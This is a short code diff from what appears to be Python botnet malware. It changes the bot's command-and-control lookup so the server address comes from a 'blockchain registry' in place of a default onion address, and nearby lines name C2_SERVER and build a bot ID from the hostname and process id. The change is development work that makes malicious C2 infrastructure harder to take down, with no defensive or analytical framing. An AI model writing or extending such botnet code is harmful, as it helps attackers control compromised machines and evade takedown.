@@ -715,10 +715,11 @@ if __name__ == '__main__':
 
             # --- Configuration ---
             def get_c2_address():
-                logger.info("Attempting to determine C2 address...")
-                # In a real scenario, this would involve querying the blockchain or a fallback mechanism
-                # For now, we'll use the default onion address
-                return DEFAULT_CONTROL_URL
+                logger.info("Attempting to determine C2 address via blockchain registry...")
+                resolved = fetch_control_url_from_blockchain(logger)
+                update_control_url(resolved)
+                logger.info(f"Using control URL: {resolved}")
+                return resolved
 
             C2_SERVER = get_c2_address()
             BOT_ID = f"{platform.node()}-{os.getpid()}"
